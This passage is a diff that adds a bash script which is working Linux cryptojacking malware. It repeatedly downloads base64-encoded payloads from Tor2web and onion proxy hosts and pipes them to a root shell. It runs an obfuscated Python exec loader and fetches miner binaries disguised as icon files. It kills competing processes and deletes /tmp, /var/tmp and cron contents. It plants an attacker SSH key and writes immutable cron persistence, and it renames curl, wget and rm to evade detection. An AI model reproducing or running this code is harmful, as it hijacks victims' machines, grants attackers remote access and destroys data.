@@ -1,0 +1,429 @@
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+ARCH=$(uname -a)
+if [[ -f /sbin/apk ]]; then Pref="a"; elif [[ $(echo "${ARCH}"|grep 'Alpine'|wc -l) -eq 0 ]]; then Pref="r"; else Pref="a"; fi
+RHOST="https://an7kmd2wp4xo7hpr"
+TOR1=".tor2web.su/"
+TOR2=".d2web.org/"
+TOR3=".onion.sh/"
+RPATH1='src/ldm'
+RBIN1="${Pref}64x75"
+RBIN2="${Pref}32x75"
+RPATH2="images/ico/${RBIN1}.ico"
+RPATH3="images/ico/${RBIN2}.ico"
+RPATH2B="images/${RBIN1}"
+RPATH3B="images/${RBIN2}"
+#LPATH="${HOME-/tmp}/.cache/"
+CTIMEOUT="26"; TIMEOUT="75"
+COPTS=" -fsSLk --retry 2 --connect-timeout ${CTIMEOUT} --max-time ${TIMEOUT} "
+WOPTS=" --quiet --tries=2 --no-check-certificate --connect-timeout=${CTIMEOUT} --timeout=${TIMEOUT} "
+tbin=$(command -v yes); bpath=$(dirname "${tbin}"); bpath=${bpath:-"/usr/bin"}
+CHKCURL='tbin=$(command -v yes); bpath=$(dirname "${tbin}"); curl="curl"; if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ]; then curl="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}/*; do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && curl="$f" && break; done; fi; fi; wget="wget"; if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ]; then wget="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}/*; do strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && wget="$f" && break; done; fi; fi; if [ $(cat /etc/hosts|grep -i "onion.\|timesync.su\|tor2web"|wc -l) -ne 0 ]; then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1; fi; '
+
+# Lbin = local path vars.
+LBIN1="/usr/local/bin/nptd"
+LBIN2=".favicon.ico"
+LBIN3=".kswapd"
+LBIN4="/etc/cron.hourly/cronlog"
+LBIN5="/etc/cron.daily/cronlog"
+LBIN6="/etc/cron.monthly/cronlog"
+LBIN7="/usr/local/bin/npt"
+LBIN8="kthrotlds"
+LBIN9="${LPATH}.editorinfo"
+null=' >/dev/null 2>&1'
+skey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1Sdr0tIIL8yPhKTLzVMnRKj1zzGqtR4tKpM2bfBEx+AHyvBL8jDZDJ6fuVwEB+aZ8bl/pA5qhFWRRWhONLnLN9RWFx/880msXITwOXjCT3Qa6VpAFPPMazJpbppIg+LTkbOEjdDHvdZ8RhEt7tTXc2DoTDcs73EeepZbJmDFP8TCY7hwgLi0XcG8YHkDFoKFUhvSHPkzAsQd9hyOWaI1taLX2VZHAk8rOaYqaRG3URWH3hZvk8Hcgggm2q/IQQa9VLlX4cSM4SifM/ZNbLYAJhH1x3ZgscliZVmjB55wZWRL5oOZztOKJT2oczUuhDHM1qoUJjnxopqtZ5DrA76WH user@localhost"
+SCN=0
+
+function b() {
+    t=$(shuf -i 1-99 -n 1)
+    wdog0=$(ps aux|grep -v 'grep'|grep -v defunct|grep -v 'sh '|grep ' sleep 30'|wc -l)
+    if [ ${wdog0} -lt 2 ] && [ $t -lt 50 ]; then
+        if [ $(command -v timeout|wc -l) -ne 0 ]; then
+            timeout 600 $(command -v bash) -c "(${curl} ${COPTS} ${RHOST}${TOR1}src/main||${curl} ${COPTS} ${RHOST}${TOR2}src/main||${curl} ${COPTS} ${RHOST}${TOR3}src/main||${wget} ${WOPTS} ${RHOST}${TOR1}src/main||${wget} ${WOPTS} ${RHOST}${TOR2}src/main||${wget} ${WOPTS} ${RHOST}${TOR3}src/main)|base64 -d |${sudo} $(command -v bash)" &
+        else
+            (${curl} ${COPTS} ${RHOST}${TOR1}src/main||${curl} ${COPTS} ${RHOST}${TOR2}src/main||${curl} ${COPTS} ${RHOST}${TOR3}src/main||${wget} ${WOPTS} ${RHOST}${TOR1}src/main||${wget} ${WOPTS} ${RHOST}${TOR2}src/main||${wget} ${WOPTS} ${RHOST}${TOR3}src/main)|base64 -d |${sudo} $(command -v bash) &
+        fi
+        ${sudo} ${rm} -rf main* >/dev/null 2>&1
+    fi
+    if [ $t -lt 21 ]; then g; fi
+    ${sudo} ps ax|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -v ".ntp"|grep -vi "bash"|grep -i "nicehash\|linuxs\|linuxl\|Linux\|crawler.weibo\|44444\|cryptonight\|stratum\|gpg-daemon\|jobs.flu.cc\|nmap\|cranberry\|start.sh\|watch.sh\|krun.sh\|killTop.sh\|cpuminer\|/60009\|ssh_deny.sh\|clean.sh\|\./over\|mrx1\|redisscan\|ebscan\|redis-cli\|barad_agent\|\.sr0\|clay\|udevs\|\.sshd\|/tmp/init"|uniq| while read pid _; do if [[ ${pid} -gt 301 ]] && [[ ! "$pid" == "$$" ]] && [[ ! "$pid" == "$!" ]] && [[ ! "$pid" == "$PPID" ]]; then ${sudo} kill -9 "${pid}"; ${sudo} kill -TERM -"${pid}"; fi; done
+    ${sudo} ps ax|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -v ".ntp"|grep -vi "bash"|grep -vi "ssh"|grep -vi 'exim'|grep -i "kworkerds\|56416\|xmr\|xig\|ddgs\|minerd\|hashvault\|geqn\|.kthreadd\|httpdz\|kworker\|config.json\|gwjyhs.com\|pastebin.com\|sobot.com\|kerbero"|uniq| while read pid _; do if [[ ${pid} -gt 301 ]] && [[ ! "$pid" == "$$" ]] && [[ ! "$pid" == "$!" ]] && [[ ! "$pid" == "$PPID" ]]; then ${sudo} kill -9 "${pid}"; ${sudo} kill -TERM -"${pid}"; fi; done
+    ${sudo} chattr -i -a ~/.cache >/dev/null 2>&1;
+    if [[ "${LPATH}" != *"/tmp/"* ]]; then
+        ${sudo} ${rm} -rf /tmp/* >/dev/null 2>&1
+        ${sudo} ${rm} -rf /tmp/.* >/dev/null 2>&1
+    else
+        ${sudo} ${rm} -f /tmp/* >/dev/null 2>&1
+        ${sudo} ${rm} -f /tmp/.* >/dev/null 2>&1
+    fi
+    hload=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -vi 'java '|grep -vi 'jenkins'|grep -vi 'exim'|awk '{if($3>=54.0) print $11}'|head -n 1)
+    [ "${hload}" != "" ] && { ${sudo} ps ax|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -vi "bash"|grep "xmr\|${hload}"|while read pid _; do if [[ ${pid} -gt 301 ]] && [[ ! "$pid" == "$$" ]] && [[ ! "$pid" == "$!" ]] && [[ ! "$pid" == "$PPID" ]]; then ${sudo} kill -9 "${pid}" >/dev/null 2>&1; fi; done; }
+    hload2=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep -v python|grep -v "${LBIN8}"|grep -vi "bash"|grep -vi 'exim'|awk '{if($3>=0.0) print $2}'|uniq)
+    if [[ ! "${hload2}" == "" ]]; then
+        for p in ${hload2}; do
+            xm=''
+            if [[ $p -gt 301 ]] && [[ ! "$pid" == "$$" ]] && [[ ! "$pid" == "$!" ]] && [[ ! "$pid" == "$PPID" ]]; then
+                if [ -f /proc/${p}/exe ]; then
+                    xmf="$(readlink /proc/${p}/cwd)/$(cat /proc/${p}/comm)"
+                    xm=$(grep -i "xmr\|cryptonight\|hashrate" /proc/${p}/exe 2>&1)
+                elif [ -f /proc/${p}/comm ]; then
+                    xmf="$(readlink /proc/${p}/cwd)/$(cat /proc/${p}/comm)"
+                    xm=$(grep -i "xmr\|cryptonight\|hashrate" ${xmf} 2>&1)
+                fi
+                if [[ "${xm}" == *"matches"* ]] || [[ "$(readlink /proc/${p}/exe)" == *"/tmp/"* ]] || [[ "${xmf}" == *"/tmp/"* ]]; then ${sudo} kill -9 ${p} >/dev/null 2>&1; ${sudo} ${rm} -rf ${xmf} >/dev/null 2>&1; fi
+            fi
+        done
+    fi
+    others=$(${sudo} ps aux|grep -v grep|grep -v defunct|grep -v "${LBIN8}"|grep -vi "bash"|grep -vi 'exim'|awk '{if($3>=4.0) print $11}')
+    if [  "${others}" != "" ]; then
+        for o in ${others}; do
+            okill=0
+            if [ -f "${o}" ]; then
+                if grep -qi 'ddgs' "${o}" 2>/dev/null && grep -qi 'slave' "${o}" 2>/dev/null; then okill=1; fi
+                if grep -qi 'kerberods' "${o}" 2>/dev/null || grep -qi 'khugepageds' "${o}" 2>/dev/null; then okill=1; fi
+                if [ ${okill} -eq 1 ]; then
+                    ${sudo} ps ax|grep -v grep|grep -v defunct|grep "${o}"|while read pid _; do ${sudo} kill -9 "$pid" >/dev/null 2>&1; done
+                    ${sudo} chattr -i -a "${o}" >/dev/null 2>&1; ${rm} -rf "${o}" >/dev/null 2>&1
+                fi
+            fi
+        done
+    fi
+    if [[ ${sudoer} == 1 ]]; then
+        ${sudo} chattr -i -a -R /tmp >/dev/null 2>&1; ${sudo} chattr -i -a -R /tmp/ >/dev/null 2>&1
+        ${sudo} ln -sf /etc/ld.so.preload /tmp/.ld.so >/dev/null 2>&1
+        ${sudo} echo '' >/tmp/.ld.so >/dev/null 2>&1
+        ${sudo} ${rm} -rf /etc/ld.so.preload* >/dev/null 2>&1
+        ${sudo} ${rm} -rf /var/tmp/* >/dev/null 2>&1
+        ${sudo} ${rm} -rf /var/tmp/.* >/dev/null 2>&1
+        if [ -d /etc/systemd/system/ ]; then ${sudo} ${rm} -rf /etc/systemd/system/cloud* >/dev/null 2>&1; fi
+        if [[ ! "$(crontab -l 2>/dev/null)" == *"${RHOST}"* ]] || [[ "$(crontab -l 2>/dev/null)" == *"3ei.xyz"* ]] || [[ "$(crontab -l 2>/dev/null)" == *"pastebin.com/raw/"* ]]; then
+            ${sudo} chattr -a -i /etc/crontab >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron >/dev/null 2>&1; ${sudo} chattr -i -a -R /var/spool/cron/ >/dev/null 2>&1; ${sudo} chattr -i -a /etc/cron.d >/dev/null 2>&1; ${sudo} chattr -i -a -R /etc/cron.d/ >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a -R /var/spool/cron/crontabs/ >/dev/null 2>&1
+            ${sudo} ${rm} -rf /var/spool/cron/crontabs/* >/dev/null 2>&1; ${sudo} ${rm} -rf /var/spool/cron/crontabs/.* >/dev/null 2>&1; ${sudo} ${rm} -f /var/spool/cron/* >/dev/null 2>&1; ${sudo} ${rm} -f /var/spool/cron/.* >/dev/null 2>&1; ${sudo} ${rm} -f /etc/cron.d/* >/dev/null 2>&1; ${sudo} ${rm} -f /etc/cron.d/.* >/dev/null 2>&1
+            if [ -f /sbin/apk ]; then
+                ${sudo} mkdir -p /etc/crontabs >/dev/null 2>&1; ${sudo} ${rm} -rf /etc/crontabs/* >/dev/null 2>&1; ${sudo} echo -e "${C1}" > /etc/crontabs/root && ${sudo} echo -e "${C2}" >> /etc/crontabs/root && ${sudo} echo '' >> /etc/crontabs/root && ${sudo} crontab /etc/crontabs/root 2>/dev/null; ${sudo} chattr +i /etc/crontabs/root 2>/dev/null
+            elif [ -f /usr/bin/apt-get ]; then
+                ${sudo} mkdir -p /var/spool/cron/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/crontabs/root >/dev/null 2>&1
+                rs=$(${sudo} echo -e "${C1}" > /var/spool/cron/crontabs/root 2>&1)
+                if [[ ${rs} == "" ]]; then ${sudo} echo -e '' >> /var/spool/cron/crontabs/root 2>&1 && ${sudo} chmod 600 /var/spool/cron/crontabs/root && ${sudo} crontab /var/spool/cron/crontabs/root 2>/dev/null; fi
+                ${sudo} chattr +i /var/spool/cron/crontabs/root 2>/dev/null
+            else
+                ${sudo} mkdir -p /var/spool/cron >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/root >/dev/null 2>&1
+                rs=$(${sudo} echo -e "${C1}" > /var/spool/cron/root 2>&1)
+                if [[ ${rs} == "" ]]; then ${sudo} echo -e '' >> /var/spool/cron/root && ${sudo} crontab /var/spool/cron/root 2>/dev/null; fi
+                ${sudo} chattr +i /var/spool/cron/root 2>/dev/null
+            fi
+            ${sudo} chattr -i -a /etc/crontab >/dev/null 2>&1; rs=$(${sudo} echo -e "${C2}" > /etc/crontab 2>&1)
+            if [ -z "${rs}" ]; then ${sudo} echo -e '' >> /etc/crontab && ${sudo} crontab /etc/crontab 2>/dev/null; fi
+            ${sudo} mkdir -p /etc/cron.d >/dev/null 2>&1; ${sudo} chattr -i -a /etc/cron.d/root >/dev/null 2>&1
+            rs=$(${sudo} echo -e "${C2}" > /etc/cron.d/root 2>&1 && ${sudo} echo -e '' >> /etc/cron.d/root 2>&1)
+            #if [[ ${rs} == "" ]]; then ${sudo} crontab /etc/cron.d/root 2>/dev/null; fi
+            ${sudo} chmod 600 /etc/cron.d/root >/dev/null 2>&1; ${sudo} chattr +i /etc/crontab /etc/cron.d/root >/dev/null 2>&1
+        fi
+
+        ${sudo} mkdir -p "${sshdir}" >/dev/null 2>&1; if [ ! -f ${sshdir}/authorized_keys ]; then ${sudo} touch ${sshdir}/authorized_keys >/dev/null 2>&1; fi
+        ${sudo} chattr -i -a ${LPATH} >/dev/null 2>&1; ${sudo} chattr -i -a "${sshdir}" >/dev/null 2>&1; ${sudo} chattr -i -a -R "${sshdir}/" >/dev/null 2>&1; ${sudo} chattr -i -a ${sshdir}/authorized_keys >/dev/null 2>&1
+        if [ -n "$(grep -F redis ${sshdir}/authorized_keys)" ] || [ $(wc -l < ${sshdir}/authorized_keys) -gt 50 ]; then ${sudo} echo "${skey}" > ${sshdir}/authorized_keys; fi
+        if test "$(${sudo} grep "^${skey}" ${sshdir}/authorized_keys)" != "${skey}"; then  ${sudo} echo -e "${skey}" >> ${sshdir}/authorized_keys; fi
+        ${sudo} chmod 0700 ${sshdir} >/dev/null 2>&1; ${sudo} chmod 600 ${sshdir}/authorized_keys >/dev/null 2>&1; ${sudo} chattr +i ${sshdir}/authorized_keys >/dev/null 2>&1; ${sudo} ${rm} -rf ${sshdir}/authorized_keys* >/dev/null 2>&1
+        [ $(${sudo} cat /etc/hosts|grep -i "onion."|wc -l) -ne 0 ] && { ${sudo} chattr -i -a /etc/hosts >/dev/null 2>&1; ${sudo} chmod 644 /etc/hosts >/dev/null 2>&1; ${sudo} sed -i '/.onion.$/d' /etc/hosts >/dev/null 2>&1; }
+        [ $(${sudo} cat /etc/hosts|grep -i "tor2web."|wc -l) -ne 0 ] && { ${sudo} chattr -i -a /etc/hosts >/dev/null 2>&1; ${sudo} chmod 644 /etc/hosts >/dev/null 2>&1; ${sudo} sed -i '/.tor2web.$/d' /etc/hosts >/dev/null 2>&1; }
+        [ $(${sudo} cat /etc/hosts|grep -i "timesync.su"|wc -l) -ne 0 ] && { ${sudo} chattr -i -a /etc/hosts >/dev/null 2>&1; ${sudo} chmod 644 /etc/hosts >/dev/null 2>&1; ${sudo} sed -i '/timesync.su$/d' /etc/hosts >/dev/null 2>&1; }
+        [ $(${sudo} cat /etc/hosts|grep -i "onion.\|timesync.su\|tor2web"|wc -l) -ne 0 ] && { ${sudo} echo -e '127.0.0.1 localhost' > /etc/hosts >/dev/null 2>&1; }
+    else
+        if [[ ! "$(crontab -l 2>/dev/null)" == *"${RHOST}"* ]]; then
+            crontab -r >/dev/null 2>&1
+            (crontab -l >/dev/null 2>&1; echo "${C1}") | crontab -
+        fi
+    fi
+    if [[ $(date +%M) ==  "01" ]] || [[ $(date +%M) ==  "31" ]]; then
+        mkdir -p ${LPATH} >/dev/null 2>&1; ${sudo} chattr -i ${LPATH} >/dev/null 2>&1; chmod 1755 ${LPATH} >/dev/null 2>&1
+        tbin=$(command -v yes); bpath=$(dirname "${tbin}"); bpath=${bpath:-"/usr/bin"}
+        if [ $(rm --help 2>/dev/null|grep " rm does not remove dir"|wc -l) -ne 0 ]; then rm="rm"; elif [ $(rrn --help 2>/dev/null|grep " rm does not remove dir"|wc -l) -ne 0 ]; then rm="rrn"; else rm="echo"; for f in /bin/*; do strings $f 2>/dev/null|grep -qi " rm does not remove dir" && rm="$f" && ${sudo} mv -f $rm /bin/rrn && break; done; fi
+        if [ $(curl --help 2>/dev/null|grep -i "Dump libcurl equivalent"|wc -l) -ne 0 ]; then curl="curl"; elif [ $(lxc --help 2>/dev/null|grep -i "Dump libcurl equivalent"|wc -l) -ne 0 ]; then curl="lxc"; else curl="echo"; for f in ${bpath}/*; do strings $f 2>/dev/null|grep -qi "Dump libcurl equivalent" && curl="$f" && ${sudo} mv -f $curl ${bpath}/lxc && break; done; fi
+        if [ $(wget --version 2>/dev/null|grep -i "wgetrc "|wc -l) -ne 0 ]; then wget="wget"; elif [ $(lxw --version 2>/dev/null|grep -i "wgetrc "|wc -l) -ne 0 ]; then wget="lxw"; else wget="echo"; for f in ${bpath}/*; do strings $f 2>/dev/null|grep -qi ".wgetrc'-style command" && wget="$f" && ${sudo} mv -f $wget ${bpath}/lxw && break; done; fi
+        if [ $(cat /etc/hosts|grep -i "onion.\|timesync.su\|tor2web"|wc -l) -ne 0 ]; then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1; fi
+        if [ $(command -v timeout|wc -l) -ne 0 ]; then
+            timeout 600 $(command -v bash) -c "(${curl} ${COPTS} ${RHOST}${TOR1}${RPATH1}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH1}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH1}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH1}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH1}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH1})| ${sudo} $(command -v sh)" &
+        else
+            (${curl} ${COPTS} ${RHOST}${TOR1}${RPATH1}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH1}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH1}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH1}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH1}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH1})| ${sudo} $(command -v sh) &
+        fi
+        ${sudo} ${rm} -rf ldm* >/dev/null 2>&1
+    fi
+}
+
+function d() {
+    CTIMEOUT="26"; TIMEOUT="175"
+    COPTS=" -fsSLk --retry 2 --connect-timeout ${CTIMEOUT} --max-time ${TIMEOUT} "
+    WOPTS=" --quiet --tries=2 --no-check-certificate --connect-timeout=${CTIMEOUT} --timeout=${TIMEOUT} "
+    ${sudo} ${rm} -rf "${LPATH}*.ico*" >/dev/null 2>&1
+    ${sudo} ${rm} -rf "${LPATH}r64*" >/dev/null 2>&1
+    ${sudo} ${rm} -rf "${LPATH}r32*" >/dev/null 2>&1
+    ${rm} -rf ${LPATH}${LBIN2} >/dev/null 2>&1
+    ${sudo} chattr -i ${LPATH}${LBIN3} >/dev/null 2>&1
+    zip=$(unzip --help 2>&1)
+    if [[ ${zip} == *"not found"* ]]; then
+        RPATH2="images/${RBIN1}"
+        RPATH3="images/${RBIN2}"
+        LBIN2="${LBIN3}"
+    fi
+    if [ ! $(echo "${ARCH}"|grep 'x86_64'|wc -l) -eq 0 ]; then
+        (${curl} ${COPTS} ${RHOST}${TOR1}${RPATH2} -o ${LPATH}${LBIN2}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH2} -o ${LPATH}${LBIN2}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH2} -o ${LPATH}${LBIN2}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH2} -O ${LPATH}${LBIN2}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH2} -O ${LPATH}${LBIN2}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH2} -O ${LPATH}${LBIN2})
+        RBIN=${RBIN1}
+    else
+        (${curl} ${COPTS} ${RHOST}${TOR1}${RPATH3} -o ${LPATH}${LBIN2}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH3} -o ${LPATH}${LBIN2}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH3} -o ${LPATH}${LBIN2}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH3} -O ${LPATH}${LBIN2}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH3} -O ${LPATH}${LBIN2}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH3} -O ${LPATH}${LBIN2})
+        RBIN=${RBIN2}
+    fi
+    #chmod +x ${LPATH}${LBIN2}
+    if [[ ! ${zip} == *"not found"* ]]; then
+        ${rm} -rf ${RBIN}; ${rm} -rf ${LPATH}${LBIN3}
+        unzip -qjoP no-password ${LPATH}${LBIN2} >/dev/null 2>&1; sleep 3
+        mv ${RBIN} ${LPATH}${LBIN3}
+    fi
+    if [ ! -f ${LPATH}${LBIN3} ]; then
+        if [ ! $(echo "${ARCH}"|grep 'x86_64'|wc -l) -eq 0 ]; then
+            (${curl} ${COPTS} ${RHOST}${TOR1}${RPATH2B} -o ${LPATH}${LBIN3}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH2B} -o ${LPATH}${LBIN3}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH2B} -o ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH2B} -O ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH2B} -O ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH2B} -O ${LPATH}${LBIN3})
+            RBIN=${RBIN1}
+        else
+            (${curl} ${COPTS} ${RHOST}${TOR1}${RPATH3B} -o ${LPATH}${LBIN3}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH3B} -o ${LPATH}${LBIN3}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH3B} -o ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH3B} -O ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH3B} -O ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH3B} -O ${LPATH}${LBIN3})
+            RBIN=${RBIN2}
+        fi
+    fi
+    chmod +x ${LPATH}${LBIN3}
+    echo always | ${sudo} tee /sys/kernel/mm/transparent_hugepage/enabled >/dev/null 2>&1
+    ${sudo} sysctl -w vm.nr_hugepages=128 >/dev/null 2>&1
+    ${sudo} chattr +i ${LPATH}${LBIN3} >/dev/null 2>&1
+    ${sudo} chattr -i /usr/bin/[${grepmn}] >/dev/null 2>&1
+    ${sudo} ps aux|grep -v grep|grep -v defunct|grep -i "${grepmn}"|awk '{print $2}'|while read pid _; do ${sudo} kill -9 "$pid" ; done
+    if [[ ${sudoer} == 1 ]]; then
+        ${sudo} ${rm} -f /usr/bin/[${grepmn}] >/dev/null 2>&1; ${sudo} cp ${LPATH}${LBIN3} /usr/bin/[${grepmn}] >/dev/null 2>&1; ${sudo} chmod +x /usr/bin/[${grepmn}] >/dev/null 2>&1
+        ${sudo} nohup "[${grepmn}]" >/dev/null 2>&1 &
+    else
+        ${sudo} ${rm} -f ${LPATH}.${LBIN8} >/dev/null 2>&1; ${sudo} cp ${LPATH}${LBIN3} ${LPATH}.${LBIN8} >/dev/null 2>&1; ${sudo} chmod +x ${LPATH}.${LBIN8} >/dev/null 2>&1
+        ${sudo} nohup ${LPATH}.${LBIN8} >/dev/null 2>&1 &
+    fi
+}
+
+function e() {
+    ${sudo} nohup python2 -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IGJhc2U2NAppbXBvcnQgdXJsbGliMgppbXBvcnQgc3NsCkhPU1Q9Imh0dHBzOi8vYW43a21kMndwNHhvN2hwciIKUlBBVEgxPSJzcmMvc2MiCmQxPUhPU1QrIi50b3Iyd2ViLnN1LyIrUlBBVEgxCmQzPUhPU1QrIi5vbmlvbi5zaC8iK1JQQVRIMQpkMj1IT1NUKyIudG9yMndlYi5pby8iK1JQQVRIMQpkZWYgbGQodXJsLCB0KToKICAgIHRyeToKICAgICAgICBjdHggPSBzc2wuY3JlYXRlX2RlZmF1bHRfY29udGV4dCgpCiAgICAgICAgY3R4LmNoZWNrX2hvc3RuYW1lID0gRmFsc2UKICAgICAgICBjdHgudmVyaWZ5X21vZGUgPSBzc2wuQ0VSVF9OT05FCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGN0eD1GYWxzZQogICAgaWYgY3R4OgogICAgICAgICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIyLnVybG9wZW4odXJsLHRpbWVvdXQ9dCxjb250ZXh0PWN0eCkucmVhZCgpKQogICAgZWxzZToKICAgICAgICAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliMi51cmxvcGVuKHVybCx0aW1lb3V0PXQpLnJlYWQoKSkKICAgIHJldHVybiBwYWdlCnRyeToKICAgIHRyeToKICAgICAgICBwYWdlPWxkKGQxLCA0MSkKICAgICAgICBleGVjKHBhZ2UpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhZ2U9bGQoZDIsIDQxKQogICAgICAgIGV4ZWMocGFnZSkKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHBhZ2U9bGQoZDMsIDQxKQogICAgZXhlYyhwYWdlKQogICAgcGFzcw=='))" >/dev/null 2>&1 &
+    touch "${LPATH}.aYn0N29e2MItcV7Di2udY4Idnd0zOC6qsDf"
+}
+function c() {
+    ${sudo} mkdir -p /usr/local/bin >/dev/null 2>&1
+    ${sudo} chattr -i -a /usr/local/bin /etc/cron.hourly /etc/cron.daily /etc/cron.monthly >/dev/null 2>&1; ${sudo} chmod 755 /usr/local/bin /etc/cron.hourly /etc/cron.daily /etc/cron.monthly >/dev/null 2>&1
+    ${sudo} chattr -i -a /var/spool/cron >/dev/null 2>&1; ${sudo} chattr -i -a -R /var/spool/cron/ >/dev/null 2>&1; ${sudo} chattr -i -a /etc/cron.d >/dev/null 2>&1; ${sudo} chattr -i -a -R /etc/cron.d/ >/dev/null 2>&1; ${sudo} chattr -i -a /var/spool/cron/crontabs >/dev/null 2>&1; ${sudo} chattr -i -a -R /var/spool/cron/crontabs/ >/dev/null 2>&1
+    ${sudo} chattr -i -a ${LBIN1} ${LBIN4} ${LBIN5} ${LBIN6} ${LBIN7} /etc/cron.d/root /etc/cron.d/.cronbus /var/spool/cron/root /var/spool/cron/crontabs/root /etc/ld.so.preload >/dev/null 2>&1
+    (${sudo} ${curl} ${COPTS} ${RHOST}${TOR1}${RPATH1} -o ${LBIN1}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR2}${RPATH1} -o ${LBIN1}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR3}${RPATH1} -o ${LBIN1}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH1} -O ${LBIN1}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH1} -O ${LBIN1}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH1} -O ${LBIN1}) && ${sudo} chmod 755 ${LBIN1} && ${sudo} touch -acmr /bin/sh ${LBIN1} && ${sudo} cp ${LBIN1} ${LBIN7} && ${sudo} chattr +i ${LBIN1} ${LBIN7}
+    ${sudo} echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=''\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root ${LBIN1}" > /etc/crontab && ${sudo} touch -acmr /bin/sh /etc/crontab
+    ${sudo} echo -e "*/17 * * * * root ${C3}\n#" > /etc/cron.d/root && ${sudo} chmod 600 /etc/cron.d/root && ${sudo} touch -acmr /bin/sh /etc/cron.d/root && ${sudo} chattr +i /etc/cron.d/root
+    ${sudo} echo -e "*/23 * * * * root ${C3}\n#" > /etc/cron.d/.cronbus && ${sudo} chmod 600 /etc/cron.d/.cronbus && ${sudo} touch -acmr /bin/sh /etc/cron.d/.cronbus && ${sudo} chattr +i /etc/cron.d/.cronbus
+    ${sudo} echo -e "*/12 * * * * ${C3}\n#" > /var/spool/cron/root && ${sudo} chmod 600 /var/spool/cron/root && ${sudo} touch -acmr /bin/sh /var/spool/cron/root && ${sudo} chattr +i /var/spool/cron/root
+    if [ ! -f /usr/bin/yum ]; then
+        ${sudo} mkdir -p /var/spool/cron/crontabs
+        ${sudo} echo -e "*/12 * * * * ${C3}\n#" > /var/spool/cron/crontabs/root && ${sudo} chmod 600 /var/spool/cron/crontabs/root && ${sudo} touch -acmr /bin/sh /var/spool/cron/crontabs/root && ${sudo} chattr +i /var/spool/cron/crontabs/root
+    fi
+    ${sudo} mkdir -p /etc/cron.hourly
+    (${sudo} ${curl} ${COPTS} ${RHOST}${TOR1}${RPATH1} -o ${LBIN4}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR2}${RPATH1} -o ${LBIN4}||${sudo} ${curl} ${COPTS} ${RHOST}${TOR3}${RPATH1} -o ${LBIN4}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH1} -O ${LBIN4}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH1} -O ${LBIN4}||${sudo} ${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH1} -O ${LBIN4}) && ${sudo} chmod 755 ${LBIN4}
+    ${sudo} mkdir -p /etc/cron.daily
